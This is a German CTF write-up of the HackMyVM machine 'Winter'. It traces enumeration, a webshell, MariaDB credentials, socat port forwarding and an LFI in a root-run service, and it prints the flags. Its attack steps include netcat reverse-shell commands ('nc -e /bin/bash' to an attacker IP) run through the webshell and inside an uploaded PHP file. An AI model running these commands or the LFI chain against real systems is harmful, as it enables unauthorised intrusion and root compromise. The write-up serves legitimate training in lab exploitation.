# Winter - HackMyVM (Medium)
 
![Winter.png](Winter.png)

## Übersicht

*   **VM:** Winter
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Winter)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 8. November 2022
*   **Original-Writeup:** https://alientec1908.github.io/Winter_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Winter"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration eines Webservers (Port 80), auf dem eine `/robots.txt` eine Wortliste und einen Hinweis auf `fileinfo.txt` enthielt. `fileinfo.txt` wiederum verwies auf `winter` als Domainnamen. Mittels `wfuzz` wurden die Subdomains `manager.winter` und `cmd.winter` entdeckt. Auf `cmd.winter/shellcity.php` wurde eine RCE-Schwachstelle über den GET-Parameter `run` gefunden, die eine Reverse Shell als `www-data` ermöglichte. Als `www-data` wurden MariaDB-Credentials (`root:idkpass`) aus `login.php` (Hauptdomain) extrahiert. In der Datenbank `winter` wurde der Benutzer `ben` mit Passwort `benni` gefunden. Die User-Flag wurde als Benutzer `catchme` (dessen Credentials im Log nicht explizit gefunden wurden, aber `sudo`-Rechte hatte) in `/home/catchme/user.txt` gelesen. Ein interner Dienst auf `localhost:1336` wurde mittels `socat` auf Port 1337 weitergeleitet. Auf diesem Dienst wurde `snowman.php` gefunden. Der Quellcode von `snowman.php` (gelesen via `sudo -u catchme hexdump ...`) offenbarte eine LFI-Schwachstelle im GET-Parameter `exec`. Durch Hochladen einer PHP-Reverse-Shell und Auslösen der LFI (mit einem POST-Request an `snowman.php?exec=[path_to_shell]`) wurde eine Root-Shell erlangt, da der Dienst als Root lief.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `curl`
*   `nikto`
*   `gobuster`
*   `wfuzz`
*   `vi`
*   `nc` (netcat)
*   `python3` (für Shell-Stabilisierung)
*   `stty`
*   `cat`
*   `ss`
*   `sudo`
*   `ls`
*   `file` (impliziert)
*   `crontab` (versucht)
*   `printenv`
*   `mysql` (MariaDB Client)
*   `socat`
*   `hexdump`
*   `CyberChef` (impliziert für Hexdump-Dekodierung)
*   `ssh` (versucht)
*   `cp`
*   `Burp Suite` (impliziert für POST-Request an `snowman.php`)
*   Standard Linux-Befehle (`id`, `pwd`, `cd`, `echo`, `chmod`, `touch`, `export`, `reset`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Winter" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration (Hauptdomain & Subdomains):**
    *   IP-Findung mit `arp-scan` (`192.168.2.116`).
    *   `nmap`-Scan identifizierte offene Ports: 22 (SSH) und 80 (HTTP - Apache 2.4.38 "catchme").
    *   `gobuster` auf Port 80 fand u.a. `login.php`, `signup.php`, `robots.txt`, `fileinfo.txt`.
    *   `/robots.txt` enthielt eine Wortliste und Hinweise. `/fileinfo.txt` enthielt "winter is my domain name!".
    *   Eintrag von `winter`, `manager.winter`, `cmd.winter` in `/etc/hosts`.
    *   `wfuzz` zur Subdomain-Enumeration fand `manager.winter` und `cmd.winter`.
    *   `gobuster` auf `manager.winter` zeigte eine ähnliche Struktur wie die Hauptdomain.
    *   `gobuster` auf `cmd.winter` fand `shellcity.php`.

2.  **Initial Access (RCE via Webshell zu `www-data`):**
    *   `shellcity.php` auf `cmd.winter` war eine Webshell, die Befehle über den GET-Parameter `run` entgegennahm (Parameter gefunden mit `wfuzz`).
    *   Ausführung von `http://cmd.winter/shellcity.php?run=id` bestätigte RCE als `www-data`.
    *   Erlangung einer interaktiven Reverse Shell als `www-data` mittels `nc -e /bin/bash [Angreifer-IP] 9001` über die Webshell.

3.  **Privilege Escalation (Enumeration & DB Credentials):**
    *   Als `www-data`: Quellcode von `shellcity.php` und `login.php` (Hauptdomain) gelesen.
    *   `login.php` enthielt MariaDB-Credentials: `root:idkpass` für Datenbank `winter`.
    *   `ss -tulpe` zeigte einen Dienst auf `127.0.0.1:1336`. `sudo -l` für `www-data` zeigte die Berechtigung `(catchme) NOPASSWD: /usr/bin/hexdump`.
    *   Login in MariaDB als `root:idkpass`. Die Tabelle `winter.users` enthielt Klartext-Credentials, u.a. `ben:benni`.

4.  **Privilege Escalation (Port Forwarding & LFI/RCE zu `root`):**
    *   Port Forwarding mit `socat`: `socat tcp-listen:1337,reuseaddr,fork tcp:localhost:1336 &` (als `www-data`).
    *   `gobuster` auf den weitergeleiteten Port (`http://192.168.2.116:1337`) fand `snowman.php`.
    *   Quellcode von `/opt/customer/snowman.php` (Pfad aus Kontext angenommen) wurde mittels `sudo -u catchme /usr/bin/hexdump -C /opt/customer/snowman.php` gelesen und mit CyberChef dekodiert.
    *   `snowman.php` enthielt eine LFI im GET-Parameter `exec` (`include($_GET['exec'])`) und eine RCE-Logik (`system($_POST['name'])`), die nur bei gesetztem `$_POST['sub']` getriggert wurde.
    *   Eine PHP-Reverse-Shell (`r.php` mit `system("/usr/bin/nc [Angreifer-IP] 2234 -e /bin/bash");`) wurde in `/var/www/html/upload/` platziert.
    *   Auslösen der LFI/RCE durch einen POST-Request (z.B. via Burp Suite oder `curl`) an `http://192.168.2.116:1337/snowman.php?exec=/var/www/html/upload/r.php` mit dem Body `sub=Send`.
    *   Da der Dienst auf Port 1336/1337 als `root` lief, wurde eine Root-Shell auf dem Listener des Angreifers (Port 2234) etabliert.
    *   User-Flag (für `catchme`) `HMVlocalhost` und Root-Flag `HMV_127.0.0.1` wurden gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Informationslecks in `robots.txt` und `fileinfo.txt`:** Enthüllten Wortlisten und Domainnamen.
*   **Remote Code Execution (RCE) via Webshell:** Eine PHP-Seite (`shellcity.php`) erlaubte direkte Befehlsausführung.
*   **Klartext-Credentials im Quellcode und Datenbank:** Datenbank-Root-Credentials in `login.php`, Benutzer-Credentials in der Datenbank.
*   **Unsichere `sudo`-Konfiguration (`hexdump`):** Erlaubte das Auslesen von Dateien als anderer Benutzer.
*   **Local File Inclusion (LFI) in internem Dienst:** Ein als Root laufender Dienst war anfällig für LFI, was zur RCE führte.
*   **Port Forwarding (socat):** Ermöglichte den Zugriff auf einen nur lokal lauschenden, verwundbaren Dienst.
*   **Kombination von POST-Bedingung und GET-LFI:** Spezifische Ausnutzung der `snowman.php`-Logik.

## Flags

*   **User Flag (`/home/catchme/user.txt`):** `HMVlocalhost`
*   **Root Flag (`/root/root.txt`):** `HMV_127.0.0.1`

## Tags

`HackMyVM`, `Winter`, `Medium`, `robots.txt`, `Subdomain Enumeration`, `RCE`, `Webshell`, `sudo Exploitation`, `hexdump`, `MariaDB`, `Klartext Passwörter`, `socat`, `Port Forwarding`, `LFI`, `Privilege Escalation`, `Linux`, `Web`
